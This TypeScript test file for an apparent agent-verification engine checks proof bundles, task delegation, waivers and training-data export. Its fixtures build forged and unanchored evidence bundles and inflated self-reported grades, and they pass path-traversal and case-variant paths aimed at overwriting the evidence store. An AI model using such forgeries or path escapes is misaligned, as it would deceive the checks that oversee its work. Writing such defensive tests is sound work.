  return buildBundle(
    { evidenceLog: log, baselineJson: JSON.stringify(baseline, null, 2) },
    workspaceKey,
    CHILD_AT,
  )
}

/**
 * H-05's attack shape, verbatim from the audit PoC: a self-consistent bundle
 * built out of whole cloth — an UNSIGNED chain (or an empty one) carries no
 * checkpoint any key signed, so however clean its digests walk, its evidence
 * has no root to stand on.
 */
async function unanchoredChildBundle(workspaceKey = 'forged-ws'): Promise<ProofBundle> {
  const fs = MemoryFs.of({})
  const store = new EvidenceStore(fs, CHILD_LOG, CHILD_BASE, new FakeClock(), {
    workspaceKey,
    checkpointEvery: 1000,
  })
  const record = makeEvidence(
    spec({ id: 'child-test' }),
    { status: 'pass', exitCode: 0, durationMs: 5, output: 'ok\n' },
    childWs(),
    new FakeClock(),
  )
  await store.append(record)
  await store.checkpoint()
  const baseline = buildBaseline([record], childWs(), new FakeClock())
  const log = await fs.readFile(CHILD_LOG)
  assert.ok(typeof log === 'string')
  return buildBundle(
    { evidenceLog: log, baselineJson: JSON.stringify(baseline, null, 2) },
    workspaceKey,
    CHILD_AT,
  )
}

/** Tamper the evidence file WITHOUT touching the manifest — naive forgery. */
function forgedFrom(honest: ProofBundle): ProofBundle {
  const log = honest.files['evidence.jsonl'] ?? ''
  return {
    manifest: honest.manifest,
    files: { ...honest.files, 'evidence.jsonl': `${log.slice(0, -3)}tampered\n` },
  }
}

test('v0.19: delegate -> submit an honest bundle -> artifact verified, composed proven', async () => {
  const fs = MemoryFs.of(project())
  // v0.24 (Y-H-08): the parent holds the child's host key (the shared
  // trust-root deployment) — the derived 'proven' now rests on ADJUDICATED
  // signatures, not on the keyId's mere existence.
  const engine = delegatingEngine(fs)

  const { taskId, obligationId, obligation } = await engine.delegateTask({
    claim: 'port the parser to WASM',
    acceptance: 'benchmarks no slower than the JS parser',
  })
  assert.equal(taskId, 'task-1', 'the first delegation is task-1')
  assert.equal(obligation.v, 1)
  assert.equal(obligation.claim, 'port the parser to WASM')
  assert.equal(obligation.acceptance, 'benchmarks no slower than the JS parser')
  assert.equal(obligation.parentTaskId, undefined, 'a root delegation has no parent edge')
  assert.equal(obligation.issuedByWorkspace, 'default', 'the issuer is the engine workspace key')
  assert.ok(obligationId.length > 0, 'the obligation carries its content address')

  const bundle = await honestChildBundle()
  const { submission, composed } = await engine.submitDelegation({ taskId, bundle })
  assert.equal(submission.childWorkspace, 'child-ws', 'the manifest names the child workspace')
  assert.equal(submission.claimedGrade, 'proven', 'clean bundle + baseline derives proven')
  assert.equal(submission.artifactVerified, true)
  assert.equal(submission.problems, undefined, 'a clean bundle attaches no problems')
  assert.equal(submission.bundleRoot, bundleFingerprint(bundle.manifest.files),
    'the submission anchors to the manifest fingerprint')
  assert.equal(composed.grade, 'proven', 'the parent composes proven over an honest submission')

  // The graph round-trips: the marker payload reconstructs the obligation
  // exactly, and a chain only this engine wrote to carries no cycles.
  const verdict = await engine.taskVerdict({ taskId })
  assert.deepEqual(verdict.cycles, [])
  assert.equal(verdict.nodes.length, 1)
  assert.deepEqual(verdict.nodes[0]?.obligation, obligation)
})

test('v0.19: a forged submission regresses, and a waiver cannot launder it', async () => {
  const engine = makeEngine(MemoryFs.of(project()), new FakeCommands())
  const { taskId } = await engine.delegateTask({ claim: 'fix the flaky retry loop' })

  // One byte of evidence changed, manifest untouched: the exact tampering
  // verifyBundle exists to catch (digest mismatch -> manifestOk false).
  const { submission, composed } = await engine.submitDelegation({
    taskId,
    bundle: forgedFrom(await honestChildBundle()),
    claimedGrade: 'proven',
  })
  assert.equal(submission.artifactVerified, false)
  assert.ok((submission.problems ?? []).length > 0, 'verifyBundle problems ride the submission')
  assert.equal(submission.claimedGrade, 'proven', 'the child still claims proven')
  assert.equal(composed.grade, 'regressed', 'claiming proven over a broken artifact is regression')
  assert.ok(composed.forgedChildren.includes(taskId), 'the task is named as forged')

  // The waiver is recorded (the engine keeps the books — H-10: the issuer's
  // own workspace key authorises it) but the composition layer refuses it:
  // risk acceptance is not evidence.
  await engine.waiveDelegation({ taskId, by: 'default', reason: 'ship it anyway — risk accepted' })
  const after = await engine.taskVerdict({ taskId })
  assert.equal(after.composed.grade, 'regressed', 'a waiver does not lift a forgery')
  const node = after.nodes.find(n => n.obligation.taskId === taskId)
  assert.ok(node?.waiver, 'the waiver itself is on the books')
  assert.equal(node?.waiver?.by, 'default', 'the waiver names the issuing workspace that accepted the risk')
})

test('v0.19: an unsubmitted child holds the parent stale; a waiver plus own evidence composes', async () => {
  const engine = makeEngine(MemoryFs.of(project()), new FakeCommands())
  await engine.delegateTask({ claim: 'own the migration' })
  const second = await engine.delegateTask({ claim: 'port the schema', parentTaskId: 'task-1' })
  assert.equal(second.taskId, 'task-2', 'sequence numbers count created markers')
  assert.equal(second.obligation.parentTaskId, 'task-1')

  const stale = await engine.taskVerdict({ taskId: 'task-1' })
  assert.equal(stale.composed.grade, 'stale', 'a child that never submitted leaves the parent undecidable')

  await engine.waiveDelegation({ taskId: 'task-2', by: 'default', reason: 'child dropped — risk accepted' })
  const lifted = await engine.taskVerdict({ taskId: 'task-1', ownGrade: 'proven' })
  assert.equal(lifted.composed.grade, 'proven',
    'with the child waived and the parent own-proven, the verdict composes')
})

test('v0.19: parameter defenses — claim, unknown parent/task, malformed bundle, bogus grade', async () => {
  const engine = makeEngine(MemoryFs.of(project()), new FakeCommands())
  await engine.delegateTask({ claim: 'root task' })

  await assert.rejects(() => engine.delegateTask({ claim: '' }), /claim must be a non-empty string/)
  await assert.rejects(
    () => engine.delegateTask({ claim: 42 as unknown as string }),
    /claim must be a non-empty string/,
  )
  await assert.rejects(
    () => engine.delegateTask({ claim: 'orphan work', parentTaskId: 'task-99' }),
    /parentTaskId "task-99" does not exist/,
  )
  await assert.rejects(
    () => engine.submitDelegation({ taskId: 'task-404', bundle: {} }),
    /no delegation\/created marker for taskId task-404/,
  )
  await assert.rejects(
    () => engine.submitDelegation({ taskId: 'task-1', bundle: 'not a bundle' }),
    /bundle is malformed/,
  )
  await assert.rejects(
    () => engine.submitDelegation({
      taskId: 'task-1',
      bundle: {} as unknown as ProofBundle,
      claimedGrade: 'supreme' as unknown as ProofGrade,
    }),
    /claimedGrade must be one of/,
  )
  await assert.rejects(
    () => engine.waiveDelegation({ taskId: 'task-1', by: '  ', reason: 'x' }),
    /by must be a non-empty string/,
  )
  await assert.rejects(
    () => engine.waiveDelegation({ taskId: 'task-9', by: 'lead', reason: 'x' }),
    /no delegation\/created marker for taskId task-9/,
  )
  await assert.rejects(
    () => engine.taskVerdict({ taskId: 'task-9' }),
    /taskId task-9 does not exist on this chain/,
  )
})

test('v0.19: a three-deep chain propagates a forged grandchild to the top parent', async () => {
  const engine = delegatingEngine(MemoryFs.of(project()))
  await engine.delegateTask({ claim: 'top: migrate the pipeline' })
  await engine.delegateTask({ claim: 'mid: port the loaders', parentTaskId: 'task-1' })
  await engine.delegateTask({ claim: 'leaf: port the yaml loader', parentTaskId: 'task-2' })

  // The grandchild forges (tampered artifact, claimed proven); the middle
  // child submits an honest bundle afterwards — honesty in the middle must
  // not hide the forgery below it.
  await engine.submitDelegation({ taskId: 'task-3', bundle: forgedFrom(await honestChildBundle()), claimedGrade: 'proven' })
  await engine.submitDelegation({ taskId: 'task-2', bundle: await honestChildBundle('mid-child') })

  const mid = await engine.taskVerdict({ taskId: 'task-2' })
  assert.equal(mid.composed.grade, 'regressed', 'the forgery sits inside task-2 subtree')
  const top = await engine.taskVerdict({ taskId: 'task-1' })
  assert.equal(top.composed.grade, 'regressed', 'the grandchild forgery regresses the top parent')
  assert.equal(top.nodes.length, 3, 'the whole three-node DAG rebuilt from the chain')
})

test('v0.22 (H5): a clean but unanchored bundle caps at unproven — self-consistency is not a trust root', async () => {
  // The audit's headline forgery (PoC3b): a bundle whose digests all walk,
  // whose baseline self-addresses — and whose evidence chain carries no
  // checkpoint ANY key signed. verifyBundle calls it clean; the submission
  // path used to derive 'proven' from exactly that. Now the pinned problem
  // says why it cannot, the claim is capped, and the composed verdict says
  // unproven with the blocker naming the missing root.
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  const { taskId } = await engine.delegateTask({ claim: 'port the parser' })

  const { submission, composed } = await engine.submitDelegation({
    taskId,
    bundle: await unanchoredChildBundle(),
    claimedGrade: 'proven',
  })
  assert.equal(submission.artifactVerified, true, 'the artifact IS self-consistent — that was never enough')
  assert.equal(submission.claimedGrade, 'unproven', 'a proven claim over unanchored evidence is capped, not believed')
  assert.ok(submission.problems?.[0]?.includes('bundle evidence not anchored'),
    `the pinned problem explains the cap (got ${JSON.stringify(submission.problems)})`)
  assert.ok(submission.problems?.some(p => p.includes('exceeds the bundle evidence')),
    'the claimed-vs-derived discrepancy is recorded')
  assert.equal(composed.grade, 'unproven', 'the composed verdict is capped at unproven')
  assert.ok(composed.blockers.some(b => b.includes('bundle evidence not anchored')),
    'the blocker names the missing trust root')
  assert.ok(fs.log.some(l => l.includes('"delegation/verdict"') && l.includes('bundle evidence not anchored')),
    'the chain carries the refusal to derive proven')
})

test('v0.22 (H10): a waiver by anyone but the issuer is refused loudly and recorded', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  const { taskId } = await engine.delegateTask({ claim: 'port the schema' })

  // The audit's free-text waiver: "project-lead" is not the issuing
  // workspace, this host holds no anchor key — the risk acceptance is
  // refused AND the attempt is a chain fact.
  await assert.rejects(
    () => engine.waiveDelegation({ taskId, by: 'project-lead', reason: 'ship it anyway' }),
    /may not waive task-1.*only the issuing workspace \(default\)/,
  )
  assert.ok(
    fs.log.some(l => l.includes('"delegation/waive-refused"') && l.includes('project-lead')),
    'the refused waiver is on the books',
  )
  // And it lifted nothing: the task still has no waiver on record.
  const verdict = await engine.taskVerdict({ taskId })
  assert.equal(verdict.nodes[0]?.waiver, undefined, 'the refusal recorded no waiver')
})

test('v0.19: the delegation markers are chain facts — payloads read back from the log', async () => {
  const fs = MemoryFs.of(project())
  const engine = delegatingEngine(fs)
  const { obligation } = await engine.delegateTask({
    claim: 'write the migration guide',
    acceptance: 'reviewed by docs team',
  })
  await engine.submitDelegation({ taskId: 'task-1', bundle: await honestChildBundle('docs-child') })
  await engine.waiveDelegation({ taskId: 'task-1', by: 'default', reason: 'docs shipped by another team' })

  assert.ok(
    fs.log.some(l => l.includes('"delegation/created"') && l.includes('task-1') && l.includes(obligation.claim)),
    'the created marker carries the obligation',
  )
  assert.ok(
    fs.log.some(l => l.includes('"delegation/verdict"') && l.includes('docs-child') && l.includes('"claimedGrade":"proven"')),
    'the verdict marker carries the submission summary',
  )
  assert.ok(
    fs.log.some(l => l.includes('"delegation/waive"') && l.includes('default') && l.includes('docs shipped by another team')),
    'the waive marker carries by and reason',
  )
})

test('v0.22 (H11): ownGrade is testimony — the chain-derived grade composes, inflation is recorded', async () => {
  // The audit's MCP-relay attack: a caller reports ownGrade 'proven' while
  // this workspace's own freshest verdict on the chain is `stale`. The
  // composed verdict rides the CHAIN's grade; the self-report that exceeded
  // it is returned as a discrepancy and echoed into the blockers — never
  // believed, never silently ignored.
  const fs = MemoryFs.of(project())
  // v0.24 (Y-H-08/Y-H-09): the anchoring engine signs with the SAME host
  // key the starved engine holds — a chain anchored without the key is the
  // adoption shape this batch gave its own recovery test, and this fixture
  // wants an ordinary stale run over a vouched baseline instead.
  const anchoring = delegatingEngine(fs, new FakeCommands())
  await anchoring.establishBaseline()
  // A starved verification: every check skipped, the honest grade is stale,
  // and its `proof/verified` marker is the chain's freshest own verdict.
  // v0.24 (Y-H-08): the starved engine holds the child host key, so its
  // honest submission below actually anchors — the stale own-verdict this
  // test composes rides over real child evidence, not an unadjudicated one.
  const starved = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(), impactGraphLimit: 1_000, verifyBudgetMs: 1,
    signer: () => Promise.resolve(new FakeKey('child-key')),
  })
  const starvedRun = await starved.verify({ changed: ['src/a.ts'], all: true })
  assert.equal(starvedRun.report.grade, 'stale', 'fixture: the freshest own verdict is stale')

  const { taskId } = await starved.delegateTask({ claim: 'own the migration' })
  await starved.submitDelegation({ taskId, bundle: await honestChildBundle('migrator') })

  const inflated = await starved.taskVerdict({ taskId, ownGrade: 'proven' })
  assert.equal(inflated.composed.grade, 'stale', 'the self-reported proven does not lift the chain-derived stale')
  assert.ok(inflated.discrepancies?.length === 1)
  assert.match(inflated.discrepancies?.[0] ?? '', /ownGrade self-report 'proven' exceeds/)
  assert.ok(inflated.composed.blockers.some(b => b.includes("ownGrade self-report 'proven' exceeds")),
    'the discrepancy is visible in the composed blockers')

  // Same chain, no self-report at all: the derived grade still composes —
  // the derivation is the rule, not the exception path.
  const derived = await starved.taskVerdict({ taskId })
  assert.equal(derived.composed.grade, 'stale', 'the chain-derived own grade composes on its own')
  assert.equal(derived.discrepancies, undefined, 'and no self-report means no discrepancy')

  // A self-report BELOW the evidence is honest bad news and records nothing:
  // once a fresh green verify lands, claiming stale merely understates.
  const healed = makeEngine(fs, new FakeCommands())
  await healed.verify({ changed: ['src/a.ts'], all: true })
  const understated = await healed.taskVerdict({ taskId, ownGrade: 'stale' })
  assert.equal(understated.composed.grade, 'proven', 'the evidence-derived grade stands in both directions')
  assert.equal(understated.discrepancies, undefined, 'under-claiming is not a discrepancy')
})

// -- v0.20: training-data export --------------------------------------------------
//
// Every fixture below builds state with the real verbs (baseline/verify/mark
// through the real store) and asserts what `exportTrainingData` distilled.

test('v0.20: end-to-end export — flip pair, counts, reward table, root, anchor', async () => {
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const engine = makeEngine(fs, commands)
  await engine.establishBaseline()
  // One deliberate fail, then fixed: the fail→pass sequence is the flip pair
  // RL training wants to see.
  commands.on(argv => argv.includes('test'), { exitCode: 1, output: 'FAIL expected 1 to be 2' })
  await engine.verify({ changed: ['src/a.ts'], all: true })
  commands.on(argv => argv.includes('test'), { exitCode: 0, output: 'ok' })
  await engine.verify({ changed: ['src/a.ts'], all: true })

  const exported = await engine.exportTrainingData()
  assert.equal(exported.manifest.schema, TRAINING_SCHEMA)
  // The chain holds 6 decisive records (2 baseline + 2 + 2), but the export
  // is time-sliced to the CURRENT baseline's anchor (H-13): the anchoring
  // batch is an observation of the OLD state and self-comparison against it
  // is the self-proof loop, so only the 4 post-anchor records distil — and
  // one of those folds (H-14: build's identical still-passing repeat), for
  // exactly 3 verification samples.
  const records = await engine.storeView.all()
  const decisive = records.filter(r => isDecisiveStatus(r.status)).length
  assert.equal(decisive, 6, `fixture produced 6 decisive records, got ${decisive}`)
  assert.equal(exported.manifest.counts.verification, 3,
    'verification count = post-anchor decisive records, homomorphic repeats folded')
  assert.equal(exported.manifest.dedupedCount, 1, 'the folded repeat is auditable on the manifest')
  assert.ok(exported.manifest.counts['flip-pair'] >= 1, 'the fail→pass sequence yielded a flip pair')

  // The manifest root is re-derivable: the merkle root over the exported
  // samples' own content addresses — anyone holding the samples recomputes it.
  assert.equal(exported.manifest.root, merkleRoot(exported.samples.map(sampleHash)))
  // The reward law rides the manifest as a snapshot.
  assert.deepEqual(exported.manifest.rewardTable, VERDICT_REWARD)

  // The anchor names the chain state the export pinned to (last checkpoint).
  assert.ok(exported.anchor.count > 0)
  assert.ok(exported.anchor.head.length > 0)
  assert.equal(exported.anchor.keyId, undefined, 'an unsigned fixture chain has no keyId to name')

  // Reward ↔ verdict: same verdict ⇒ same reward (a table lookup), and a
  // failing status is rewarded below a passing one.
  const rewardByVerdict = new Map<string, number>()
  let failReward: number | undefined
  let passReward: number | undefined
  for (const sample of exported.samples) {
    if (sample.kind !== 'verification') continue
    assert.equal(typeof sample.reward, 'number', 'verification samples carry a numeric reward')
    const seen = rewardByVerdict.get(sample.verdict)
    assert.ok(seen === undefined || seen === sample.reward,
      `reward is a per-verdict table lookup (${sample.verdict}: ${seen} vs ${sample.reward})`)
    rewardByVerdict.set(sample.verdict, sample.reward)
    if (sample.status === 'fail') failReward = sample.reward
    if (sample.status === 'pass') passReward = sample.reward
  }
  assert.ok(failReward !== undefined && passReward !== undefined, 'the fixture produced both outcomes')
  assert.ok(failReward < passReward, 'blame is rewarded below credit')
})

test('v0.20: private is the default fidelity — no output text leaks; full carries excerpts', async () => {
  // Green baseline first so the failure lands POST-anchor (H-13 slices the
  // anchoring batch out — the secret must live in the records that distil).
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const engine = makeEngine(fs, commands)
  await engine.establishBaseline()
  commands.on(argv => argv.includes('test'), { exitCode: 1, output: 'SECRET-FAILURE-TOKEN unique to this run' })
  await engine.verify({ changed: ['src/a.ts'], all: true })

  const priv = await engine.exportTrainingData()
  assert.equal(priv.manifest.fidelity, 'private')
  assert.ok(!JSON.stringify(priv.samples).includes('SECRET-FAILURE-TOKEN'),
    'the privacy-conservative default carries no output text')

  const full = await engine.exportTrainingData({ fidelity: 'full' })
  assert.equal(full.manifest.fidelity, 'full')
  assert.ok(JSON.stringify(full.samples).includes('SECRET-FAILURE-TOKEN'),
    'full fidelity carries the output excerpt')
})

test('v0.20: agent-only is the default filter — external attribution is skipped; no provenance degrades honestly', async () => {
  // (a) Degradation: our own markers record the attribution METHOD, not a
  // per-path map, so the filter has nothing to enforce — distillation runs
  // unfiltered and the manifest still records what was requested.
  const plain = makeEngine(MemoryFs.of(project()), new FakeCommands())
  await plain.establishBaseline()
  await plain.verify({ changed: ['src/a.ts'], all: true })
  const plainDefault = await plain.exportTrainingData()
  const plainAll = await plain.exportTrainingData({ provenanceFilter: 'all' })
  assert.equal(plainDefault.manifest.provenanceFilter, 'agent-only')
  assert.equal(plainDefault.manifest.counts.verification, plainAll.manifest.counts.verification,
    'no provenance on chain → nothing to filter, both policies agree')

  // (b) External attribution: a boundary marker whose attribution payload is
  // the per-path map (written through the REAL store — the same channel
  // verify() itself uses) says the change came from outside the agent.
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  await engine.verify({ changed: ['src/a.ts'], all: true })
  await engine.storeView.mark('proof/verified', {
    grade: 'proven',
    root: 're-attributed',
    changed: ['src/a.ts'],
    attribution: { 'src/a.ts': 'external' },
  })

  const all = await engine.exportTrainingData({ provenanceFilter: 'all' })
  assert.ok(all.manifest.counts.verification > 0)
  const agentOnly = await engine.exportTrainingData()
  assert.equal(agentOnly.manifest.provenanceFilter, 'agent-only')
  assert.ok(agentOnly.manifest.counts.verification < all.manifest.counts.verification,
    `agent-only skips external-attributed verification behaviour (${agentOnly.manifest.counts.verification} < ${all.manifest.counts.verification})`)
  // The changed-path default also recovered from the marker payload.
  const samplePaths = [...new Set(all.samples.flatMap(s => s.kind === 'verification' ? s.changedPaths : []))].sort()
  assert.deepEqual(samplePaths, ['src/a.ts'])
})

test('v0.20: path writes the two files — JSONL lines match samples, manifest parses and agrees', async () => {
  const root = join(CONJURE_ROOT, 'training-export')
  await fsp.rm(root, { recursive: true, force: true })
  await fsp.mkdir(join(root, 'src'), { recursive: true })
  await fsp.writeFile(join(root, 'package.json'), JSON.stringify({ name: 'export-fixture', private: true }))
  await fsp.writeFile(join(root, 'src', 'feature.ts'), 'export const feature = 2\n')
  // Real fs store (the evidence log AND the export land on disk); fake
  // commands/workspace keep the run itself hermetic.
  const engine = new ProofEngine({
    root,
    fs: new NodeFsPort(),
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(root),
    clock: new FakeClock(),
    autoDiscover: false,
    checks: [{ label: 'unit', command: ['node', '-e', 'process.exit(0)'], kind: 'test', paths: ['src/**'] }],
  })
  try {
    await engine.establishBaseline()
    await engine.verify({ changed: ['src/feature.ts'], all: true })
    // H-16: the export path is workspace-RELATIVE — the engine confines it
    // under its own root, refusing absolute paths and `..` escapes outright.
    const exported = await engine.exportTrainingData({
      path: 'out/train.jsonl',
      license: 'CC-BY-4.0',
    })
    const jsonl = await fsp.readFile(join(root, 'out', 'train.jsonl'), 'utf8')
    const lines = jsonl.split('\n').filter(l => l.trim().length > 0)
    assert.equal(lines.length, exported.samples.length, 'one JSONL line per sample')
    for (const [i, line] of lines.entries()) {
      assert.deepEqual(JSON.parse(line), exported.samples[i], `line ${i} round-trips its sample`)
    }
    const manifest = JSON.parse(await fsp.readFile(join(root, 'out', 'train.jsonl.manifest.json'), 'utf8'))
    assert.equal(manifest.root, exported.manifest.root)
    assert.equal(manifest.license, 'CC-BY-4.0')
    assert.equal(manifest.counts.verification, exported.manifest.counts.verification)
    assert.equal(manifest.root.length, 64, 'the manifest carries a sha-256 root')
  } finally {
    await fsp.rm(root, { recursive: true, force: true })
  }
})

test('v0.22 (H16): export paths that leave the workspace are refused loudly, nothing is written', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  await engine.verify({ changed: ['src/a.ts'], all: true })

  // Literal absolute spellings (not path.join — on Windows it would fold the
  // forward slashes away and stop exercising the branches under test).
  await assert.rejects(
    () => engine.exportTrainingData({ path: '/ws/escape/train.jsonl' }),
    /path must be workspace-relative — absolute paths are refused/,
  )
  await assert.rejects(
    () => engine.exportTrainingData({ path: 'C:/outside/train.jsonl' }),
    /path must be workspace-relative — absolute paths are refused/,
  )
  await assert.rejects(
    () => engine.exportTrainingData({ path: '\\\\server\\share\\train.jsonl' }),
    /path must be workspace-relative — absolute paths are refused/,
    'M-35: backslash-UNC roots are absolute too',
  )
  await assert.rejects(
    () => engine.exportTrainingData({ path: '../../evidence.jsonl' }),
    /path must stay inside the workspace/,
  )
  await assert.rejects(
    () => engine.exportTrainingData({ path: 'sub/../../outside.jsonl' }),
    /path must stay inside the workspace/,
    'a dotdot that re-enters is refused too — no arithmetic at the trust boundary',
  )
  // N-2 (red team): case is not a boundary — on the case-insensitive
  // filesystems most agents run on, `.PROOF/evidence.jsonl` IS the store, and
  // an export there would truncate the chain that anchors the dataset.
  await assert.rejects(
    () => engine.exportTrainingData({ path: '.PROOF/evidence.jsonl' }),
    /path resolves into the evidence store/,
    'the case-variant spelling of the store is refused',
  )
  await assert.rejects(
    () => engine.exportTrainingData({ path: '.Proof./baseline.json' }),
    /path resolves into the evidence store/,
    'separator and Win32 trailing-dot deformations of the store are refused',
  )
  // The refused exports wrote nothing anywhere.
  assert.equal([...fs.files.keys()].filter(p => p.includes('escape') || p.includes('outside') || p.includes('server')).length, 0)
  // ...and the store itself was never the write target: its log still ends
  // with the verification marker, not a training sample.
  const log = await fs.readFile(`${ROOT}/.proof/evidence.jsonl`)
  assert.ok(log !== undefined && !log.includes('"reward"'), 'the evidence log was not overwritten by an export')
})

test('v0.22 (N-6): a re-anchor under a MUTATED script body leaves the identity swap on the chain', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()

  // Swap the body under the same check id, then re-anchor: the drift dies
  // with the old baseline and the new one inherits the id's history — the
  // laundering is exactly what this marker makes impossible to miss.
  fs.mutate(`${ROOT}/package.json`, JSON.stringify({ name: 'demo', scripts: { test: 'node -e ""', build: 'tsc -b' } }))
  await engine.establishBaseline()

  const marker = fs.log.find(l => l.includes('baseline/script-mutation'))
  assert.ok(marker !== undefined, 'the re-anchor recorded the script-body mutation as a chain fact')
  assert.match(marker, /"mutated":\s*1/, 'one id anchored under a different body')
  assert.match(marker, /package\.json:[0-9a-f]+/, 'the mutated id is named')
})

test('v0.22 (H13): a chain that fails its own audit is refused as a dataset source', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  await engine.verify({ changed: ['src/a.ts'], all: true })

  // Tamper the baseline behind the chain's back: the audit refuses, and the
  // export — which would otherwise distil "untrusted bytes into a
  // self-consistent poisoned dataset" — refuses too.
  const raw = await fs.readFile(`${ROOT}/.proof/baseline.json`)
  assert.ok(raw !== undefined)
  const parsed = JSON.parse(raw) as { scriptDigests?: unknown }
  delete parsed.scriptDigests
  fs.mutate(`${ROOT}/.proof/baseline.json`, JSON.stringify(parsed, null, 2))

  await assert.rejects(
    () => engine.exportTrainingData(),
    /failed its integrity audit.*baseline file no longer matches/,
  )
  // Nothing was minted, nothing was written.
  await assert.rejects(() => engine.exportTrainingData({ path: 'train.jsonl' }), /integrity audit/)
  assert.equal(fs.files.has(`${ROOT}/train.jsonl`), false, 'a refused export writes no files')
})

/** A clock that never moves — two exports over identical state must agree exactly. */
class StaticClock {
  now(): number { return 1_700_000_000_000 }
}

test('v0.20: identical chain state exports deepEqual — generatedAt rides the injected clock', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  await engine.verify({ changed: ['src/a.ts'], all: true })
  // A second engine over the SAME log, holding a frozen clock: the only
  // legitimate difference between two exports would be the clock.
  const frozen = new ProofEngine({
    root: ROOT,
    fs,
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(ROOT),
    clock: new StaticClock(),
  })
  const first = await frozen.exportTrainingData()
  const second = await frozen.exportTrainingData()
  assert.deepEqual(second, first)
  assert.equal(first.manifest.generatedAt, new Date(1_700_000_000_000).toISOString())
})

test('v0.20: an empty chain exports an honest empty dataset — no throw, zero counts', async () => {
  const engine = makeEngine(MemoryFs.of(project()), new FakeCommands())
  const exported = await engine.exportTrainingData()
  assert.equal(exported.samples.length, 0)
  assert.equal(exported.manifest.counts.verification, 0)
  assert.equal(exported.manifest.counts['flip-pair'], 0)
  assert.equal(exported.manifest.root, merkleRoot([]), 'the empty dataset commits to the empty merkle root')
  assert.deepEqual(exported.anchor, { count: 0, head: '' })
  assert.equal(exported.manifest.fidelity, 'private')
  assert.equal(exported.manifest.provenanceFilter, 'agent-only')
})

// -- v0.21: engine economics (E1 wiring) ----------------------------------
//
// The engine owns three seams over core/economics.ts: the run ledger rides
// verify/verifyContract when a rate card is supplied (optional on purpose —
// the outcome's shape without it is unchanged), the scheduler's
// prior/posterior trajectory feeds the ledger's "what was purchased", and
// slaQuote wraps the pricer with boundary defense plus an auditable
// `economics/quote` marker.

/** Read every `economics/quote` marker payload back off the chain, in log order. */
async function quoteMarkers(fs: MemoryFs): Promise<Record<string, unknown>[]> {
  const lines = await fs.readLines(`${ROOT}/.proof/evidence.jsonl`)
  const out: Record<string, unknown>[] = []
  for (const line of lines) {
    const envelope = JSON.parse(line) as { kind?: string; payload?: { label?: string } }
    if (envelope.kind === 'marker' && envelope.payload?.label === 'economics/quote') {
      out.push(envelope.payload as Record<string, unknown>)
    }
  }
  return out
}

test('v0.21: a bayesian verify with economics prices what the run spent and bought', async () => {
  const fs = MemoryFs.of(project())
  // Explicit durations, so the ledger's computeMs has an exact independent
  // expectation: 40ms (test) + 60ms (build) = 100ms of measured compute.
  const commands = new FakeCommands()
    .on(argv => argv.includes('test'), { exitCode: 0, output: 'ok', durationMs: 40 })
    .on(argv => argv.includes('build'), { exitCode: 0, output: 'ok', durationMs: 60 })
  const engine = makeEngine(fs, commands)
  await engine.establishBaseline()

  const outcome = await engine.verify({
    changed: ['src/a.ts'],
    economics: { rate: { currency: 'USD', computePerMs: 0.001 } },
  })
  assert.ok(outcome.economics, 'the economics block is present when a rate was supplied')
  const { ledger, priorProbability, posteriorProbability } = outcome.economics
  assert.equal(ledger.computeMs, 100, "computeMs is exactly Σ durationMs over this run's records")
  assert.equal(ledger.assertions, 2)
  assert.equal(ledger.decisiveCount, 2, 'both checks answered decisively')
  assert.equal(ledger.skippedCount, 0)
  assert.ok(priorProbability !== null && priorProbability > 0 && priorProbability < 1,
    'the scheduler priors price a real, non-degenerate "before"')
  // Independent cross-check: the posterior is the report's own final product
  // — same factor map, same sorted multiplication, so the two numbers are
  // one number, never two that drifted.
  assert.equal(posteriorProbability, outcome.report.confidence)
  assert.ok(posteriorProbability !== null && posteriorProbability > priorProbability,
    'two green decisive passes bought certainty')
  assert.ok(ledger.confidencePurchased !== null
    && Math.abs(ledger.confidencePurchased - (posteriorProbability - priorProbability)) < 1e-12,
    'confidencePurchased is exactly posterior − prior')
  assert.ok(ledger.infoNats > 0, 'each green pass resolved entropy')
  assert.equal(ledger.humanReviewItems, 0, 'plain verify fuses no B/C testimony (v0.9 semantics)')
  assert.ok(ledger.cost > 0)
  assert.ok(ledger.costPerAssertion !== null && ledger.costPerAssertion > 0,
    'per-assertion unit price is priced when assertions were bought')
  assert.ok(ledger.confidencePerDollar !== null && ledger.confidencePerDollar > 0)
  assert.ok(ledger.natsPerDollar !== null && ledger.natsPerDollar > 0)

  // Without the option the outcome's shape is unchanged: no economics key at
  // all — canonical consumers that never asked see nothing new.
  const plain = await engine.verify({ changed: ['src/a.ts'] })
  assert.ok(!('economics' in plain), 'no economics key when no rate was supplied')
})

test('v0.21: a budget-starved run with economics shows every skip and prices no purchase', async () => {
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const anchoring = makeEngine(fs, commands)
  await anchoring.establishBaseline()
  const starved = new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    verifyBudgetMs: 1,
    concurrency: 2,
  })
  const outcome = await starved.verify({
    changed: ['src/a.ts'],
    all: true,
    economics: { rate: { currency: 'USD', computePerMs: 0.001, humanReviewPerItem: 2 } },
  })
  assert.equal(outcome.report.grade, 'stale')
  assert.ok(outcome.economics)
  const { ledger, priorProbability, posteriorProbability } = outcome.economics
  // Whole-batch path: confidence is display-only here, no scheduler
  // trajectory was priced — the numbers are null, not guessed.
  assert.equal(priorProbability, null)
  assert.equal(posteriorProbability, null)
  assert.equal(ledger.computeMs, 0, 'skipped records carry no measured duration')
  assert.ok(ledger.skippedCount > 0, 'the sunk cost is visible, not hidden')
